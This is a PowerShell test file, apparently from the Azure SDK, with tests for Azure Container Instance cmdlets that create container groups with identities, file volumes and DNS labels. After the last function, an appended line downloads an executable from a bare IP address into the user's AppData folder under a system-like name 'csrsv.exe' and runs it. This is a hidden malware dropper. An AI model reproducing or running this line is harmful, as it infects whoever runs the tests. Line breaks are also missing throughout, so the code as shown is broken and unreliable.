function Test-AzureRmContainerGroup{$resourceGroupName = Get-RandomResourceGroupName$containerGroupName = Get-RandomContainerGroupName$location = Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups"$image = "nginx"$osType = "Linux"$restartPolicy = "Never"$port1 = 8000$port2 = 8001try{New-AzResourceGroup -Name $resourceGroupName -Location $location$containerGroupCreated = New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -OsType $osType -RestartPolicy $restartPolicy -IpAddressType "public" -Port @($port1, $port2) -Cpu 1 -Memory 1.5Assert-AreEqual $containerGroupCreated.ResourceGroupName $resourceGroupNameAssert-AreEqual $containerGroupCreated.Name $containerGroupNameAssert-AreEqual $containerGroupCreated.Location $locationAssert-AreEqual $containerGroupCreated.OsType $osTypeAssert-AreEqual $containerGroupCreated.RestartPolicy $restartPolicyAssert-NotNull $containerGroupCreated.IpAddressAssert-AreEqual $containerGroupCreated.Ports.Count 2Assert-NotNull $containerGroupCreated.ContainersAssert-AreEqual $containerGroupCreated.Containers[0].Image $imageAssert-AreEqual $containerGroupCreated.Containers[0].Cpu 1Assert-AreEqual $containerGroupCreated.Containers[0].MemoryInGb 1.5$retrievedContainerGroup = Get-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupNameAssert-ContainerGroup $containerGroupCreated $retrievedContainerGroup$retrievedContainerGroupList = Get-AzContainerGroup -ResourceGroupName $resourceGroupNameAssert-AreEqual $retrievedContainerGroupList.Count 1Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroupList[0]$retrievedContainerGroup | Remove-AzContainerGroup}finally{Clean-ResourceGroup $resourceGroupName}}function Test-AzureRmContainerGroupWithIdentity{$resourceGroupName = Get-RandomResourceGroupName$containerGroupName = Get-RandomContainerGroupName$location = Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups"$image = "nginx"$osType = "Linux"$restartPolicy = "Never"$port1 = 8000$port2 = 8001try{New-AzResourceGroup -Name $resourceGroupName -Location $location$containerGroupCreated = New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -OsType $osType -RestartPolicy $restartPolicy -IpAddressType "public" -Port @($port1, $port2) -Cpu 1 -Memory 1.5 -AssignIdentityAssert-AreEqual $containerGroupCreated.ResourceGroupName $resourceGroupNameAssert-AreEqual $containerGroupCreated.Name $containerGroupNameAssert-AreEqual $containerGroupCreated.Location $locationAssert-AreEqual $containerGroupCreated.OsType $osTypeAssert-AreEqual $containerGroupCreated.RestartPolicy $restartPolicyAssert-NotNull $containerGroupCreated.IpAddressAssert-AreEqual $containerGroupCreated.Ports.Count 2Assert-NotNull $containerGroupCreated.ContainersAssert-AreEqual $containerGroupCreated.Containers[0].Image $imageAssert-AreEqual $containerGroupCreated.Containers[0].Cpu 1Assert-AreEqual $containerGroupCreated.Containers[0].MemoryInGb 1.5Assert-AreEqual "SystemAssigned" $containerGroupCreated.Identity.TypeAssert-NotNull $containerGroupCreated.Identity.PrincipalId;Assert-NotNull $containerGroupCreated.Identity.TenantId;$retrievedContainerGroup = Get-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupNameAssert-ContainerGroup $containerGroupCreated $retrievedContainerGroup$retrievedContainerGroupList = Get-AzContainerGroup -ResourceGroupName $resourceGroupNameAssert-AreEqual $retrievedContainerGroupList.Count 1Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroupList[0]$retrievedContainerGroup | Remove-AzContainerGroup}finally{Clean-ResourceGroup $resourceGroupName}}function Test-AzureRmContainerGroupWithIdentities{$resourceGroupName = Get-RandomResourceGroupName$containerGroupName = Get-RandomContainerGroupName$location = Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups"$image = "nginx"$osType = "Linux"$restartPolicy = "Never"$port1 = 8000$port2 = 8001try{New-AzResourceGroup -Name $resourceGroupName -Location $location$userIdentity = "/subscriptions/ae43b1e3-c35d-4c8c-bc0d-f148b4c52b78/resourceGroups/aci-ps-sdk-test/providers/Microsoft.ManagedIdentity/userAssignedIdentities/aci-ps-sdk-test"$containerGroupCreated = New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -OsType $osType -RestartPolicy $restartPolicy -IpAddressType "public" -Port @($port1, $port2) -Cpu 1 -Memory 1.5 -IdentityType SystemAssignedUserAssigned -IdentityId $userIdentityAssert-AreEqual $containerGroupCreated.ResourceGroupName $resourceGroupNameAssert-AreEqual $containerGroupCreated.Name $containerGroupNameAssert-AreEqual $containerGroupCreated.Location $locationAssert-AreEqual $containerGroupCreated.OsType $osTypeAssert-AreEqual $containerGroupCreated.RestartPolicy $restartPolicyAssert-NotNull $containerGroupCreated.IpAddressAssert-AreEqual $containerGroupCreated.Ports.Count 2Assert-NotNull $containerGroupCreated.ContainersAssert-AreEqual $containerGroupCreated.Containers[0].Image $imageAssert-AreEqual $containerGroupCreated.Containers[0].Cpu 1Assert-AreEqual $containerGroupCreated.Containers[0].MemoryInGb 1.5Assert-NotNull $containerGroupCreated.Identity.PrincipalIdAssert-NotNull $containerGroupCreated.Identity.TenantIdWrite-Host containerGroupCreated.Identity.UserAssignedIdentitiesAssert-NotNull $containerGroupCreated.Identity.UserAssignedIdentities[$userIdentity].PrincipalIdAssert-NotNull $containerGroupCreated.Identity.UserAssignedIdentities[$userIdentity].ClientId$retrievedContainerGroup = Get-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupNameAssert-ContainerGroup $containerGroupCreated $retrievedContainerGroup$retrievedContainerGroupList = Get-AzContainerGroup -ResourceGroupName $resourceGroupNameAssert-AreEqual $retrievedContainerGroupList.Count 1Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroupList[0]$retrievedContainerGroup | Remove-AzContainerGroup}finally{Clean-ResourceGroup $resourceGroupName}}function Test-AzureRmContainerInstanceLog{$resourceGroupName = Get-RandomResourceGroupName$containerGroupName = Get-RandomContainerGroupName$location = Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups"$image = "alpine"$osType = "Linux"try{New-AzResourceGroup -Name $resourceGroupName -Location $location$containerGroupCreated = New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -OsType $osType -IpAddressType "Public" -RestartPolicy "Never" -Command "echo hello"$containerInstanceName = $containerGroupName$log = $containerGroupCreated | Get-AzContainerInstanceLog -Name $containerInstanceNameAssert-NotNull $logRemove-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName}finally{Clean-ResourceGroup $resourceGroupName}}function Test-AzureRmContainerGroupWithVolume{$resourceGroupName = Get-RandomResourceGroupName$containerGroupName = Get-RandomContainerGroupName$location = Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups"$image = "pssdk.azurecr.io/alpine"$shareName = "acipstestshare"$accountName = "acipstest"$accountKey = "password"$secureAccountKey = ConvertTo-SecureString $accountKey -AsPlainText -Force$accountCredential = New-Object System.Management.Automation.PSCredential ($accountName, $secureAccountKey)$registryUsername = "pssdk"$registryPassword = "password"$secureRegistryPassword = ConvertTo-SecureString $registryPassword -AsPlainText -Force$registryCredential = New-Object System.Management.Automation.PSCredential ($registryUsername, $secureRegistryPassword)$mountPath = "/mnt/azfile"try{New-AzResourceGroup -Name $resourceGroupName -Location $location$containerGroupCreated = New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -RegistryCredential $registryCredential -RestartPolicy "Never" -Command "ls $mountPath" -AzureFileVolumeShareName $shareName -AzureFileVolumeAccountCredential $accountCredential -AzureFileVolumeMountPath $mountPathAssert-NotNull $containerGroupCreated.VolumesAssert-NotNull $containerGroupCreated.Volumes[0].AzureFileAssert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.ShareName $shareNameAssert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.StorageAccountName $accountNameAssert-NotNull $containerGroupCreated.Containers[0].VolumeMountsAssert-AreEqual $containerGroupCreated.Containers[0].VolumeMounts[0].MountPath $mountPathRemove-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName}finally{Clean-ResourceGroup $resourceGroupName}}function Test-AzureRmContainerGroupWithVolumeAndIdentity{$resourceGroupName = Get-RandomResourceGroupName$containerGroupName = Get-RandomContainerGroupName$location = Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups"$image = "pssdk.azurecr.io/alpine"$shareName = "acipstestshare"$accountName = "acipstest"$accountKey = "password"$secureAccountKey = ConvertTo-SecureString $accountKey -AsPlainText -Force$accountCredential = New-Object System.Management.Automation.PSCredential ($accountName, $secureAccountKey)$registryUsername = "pssdk"$registryPassword = "password"$secureRegistryPassword = ConvertTo-SecureString $registryPassword -AsPlainText -Force$registryCredential = New-Object System.Management.Automation.PSCredential ($registryUsername, $secureRegistryPassword)$mountPath = "/mnt/azfile"try{New-AzResourceGroup -Name $resourceGroupName -Location $location$containerGroupCreated = New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -RegistryCredential $registryCredential -RestartPolicy "Never" -Command "ls $mountPath" -AzureFileVolumeShareName $shareName -AzureFileVolumeAccountCredential $accountCredential -AzureFileVolumeMountPath $mountPath -AssignIdentityAssert-NotNull $containerGroupCreated.VolumesAssert-NotNull $containerGroupCreated.Volumes[0].AzureFileAssert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.ShareName $shareNameAssert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.StorageAccountName $accountNameAssert-NotNull $containerGroupCreated.Containers[0].VolumeMountsAssert-AreEqual $containerGroupCreated.Containers[0].VolumeMounts[0].MountPath $mountPathAssert-AreEqual $containerGroupCreated.Identity.Type "SystemAssigned"Assert-NotNull $containerGroupCreated.Identity.PrincipalId;Assert-NotNull $containerGroupCreated.Identity.TenantId;Remove-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName}finally{Clean-ResourceGroup $resourceGroupName}}function Test-AzureRmContainerGroupWithVolumeAndIdentities{$resourceGroupName = Get-RandomResourceGroupName$containerGroupName = Get-RandomContainerGroupName$location = Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups"$image = "pssdk.azurecr.io/alpine"$shareName = "acipstestshare"$accountName = "acipstest"$accountKey = "password"$secureAccountKey = ConvertTo-SecureString $accountKey -AsPlainText -Force$accountCredential = New-Object System.Management.Automation.PSCredential ($accountName, $secureAccountKey)$registryUsername = "pssdk"$registryPassword = "password"$secureRegistryPassword = ConvertTo-SecureString $registryPassword -AsPlainText -Force$registryCredential = New-Object System.Management.Automation.PSCredential ($registryUsername, $secureRegistryPassword)$mountPath = "/mnt/azfile"try{$userIdentity = "/subscriptions/ae43b1e3-c35d-4c8c-bc0d-f148b4c52b78/resourceGroups/aci-ps-sdk-test/providers/Microsoft.ManagedIdentity/userAssignedIdentities/aci-ps-sdk-test"New-AzResourceGroup -Name $resourceGroupName -Location $location$containerGroupCreated = New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -RegistryCredential $registryCredential -RestartPolicy "Never" -Command "ls $mountPath" -AzureFileVolumeShareName $shareName -AzureFileVolumeAccountCredential $accountCredential -AzureFileVolumeMountPath $mountPath -IdentityType SystemAssignedUserAssigned -IdentityId $userIdentityAssert-NotNull $containerGroupCreated.VolumesAssert-NotNull $containerGroupCreated.Volumes[0].AzureFileAssert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.ShareName $shareNameAssert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.StorageAccountName $accountNameAssert-NotNull $containerGroupCreated.Containers[0].VolumeMountsAssert-AreEqual $containerGroupCreated.Containers[0].VolumeMounts[0].MountPath $mountPathAssert-NotNull $containerGroupCreated.Identity.PrincipalId;Assert-NotNull $containerGroupCreated.Identity.TenantId;Assert-NotNull $containerGroupCreated.Identity.UserAssignedIdentities[$userIdentity].PrincipalIdAssert-NotNull $containerGroupCreated.Identity.UserAssignedIdentities[$userIdentity].ClientIdRemove-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName}finally{Clean-ResourceGroup $resourceGroupName}}function Test-AzureRmContainerGroupWithDnsNameLabel{$resourceGroupName = Get-RandomResourceGroupName$containerGroupName = Get-RandomContainerGroupName$fqdn = $containerGroupName + ".westus.azurecontainer.io"$location = Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups"$image = "nginx"$osType = "Linux"$restartPolicy = "Never"$port1 = 8000$port2 = 8001try{New-AzResourceGroup -Name $resourceGroupName -Location $location$containerGroupCreated = New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -OsType $osType -RestartPolicy $restartPolicy -DnsNameLabel $containerGroupName -Port @($port1, $port2) -Cpu 1 -Memory 1.5Assert-AreEqual $containerGroupCreated.ResourceGroupName $resourceGroupNameAssert-AreEqual $containerGroupCreated.Name $containerGroupNameAssert-AreEqual $containerGroupCreated.Location $locationAssert-AreEqual $containerGroupCreated.OsType $osTypeAssert-AreEqual $containerGroupCreated.RestartPolicy $restartPolicyAssert-NotNull $containerGroupCreated.IpAddressAssert-AreEqual $containerGroupCreated.DnsNameLabel $containerGroupNameAssert-AreEqual $containerGroupCreated.Fqdn $fqdnAssert-AreEqual $containerGroupCreated.Ports.Count 2Assert-NotNull $containerGroupCreated.ContainersAssert-AreEqual $containerGroupCreated.Containers[0].Image $imageAssert-AreEqual $containerGroupCreated.Containers[0].Cpu 1Assert-AreEqual $containerGroupCreated.Containers[0].MemoryInGb 1.5$retrievedContainerGroup = Get-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupNameAssert-ContainerGroup $containerGroupCreated $retrievedContainerGroup$retrievedContainerGroupList = Get-AzContainerGroup -ResourceGroupName $resourceGroupNameAssert-AreEqual $retrievedContainerGroupList.Count 1Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroupList[0]$retrievedContainerGroup | Remove-AzContainerGroup}finally{Clean-ResourceGroup $resourceGroupName}}function Assert-ContainerGroup{Param([parameter(position=0)]$Expected,[parameter(position=1)]$Actual)Assert-AreEqual $Actual.ResourceGroupName $Expected.ResourceGroupNameAssert-AreEqual $Actual.Name $Expected.NameAssert-AreEqual $Actual.Location $Expected.LocationAssert-AreEqual $Actual.OsType $Expected.OsTypeAssert-AreEqual $Actual.RestartPolicy $Expected.RestartPolicyAssert-NotNull $Actual.IpAddressAssert-AreEqual $Actual.Ports.Count $Expected.Ports.CountAssert-AreEqual $Actual.DnsNameLabel $Expected.DnsNameLabelAssert-NotNull $Actual.ContainersAssert-AreEqual $Actual.Containers[0].Image $Expected.Containers[0].ImageAssert-AreEqual $Actual.Containers[0].Cpu $Expected.Containers[0].CpuAssert-AreEqual $Actual.Containers[0].MemoryInGb $Expected.Containers[0].MemoryInGb}(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")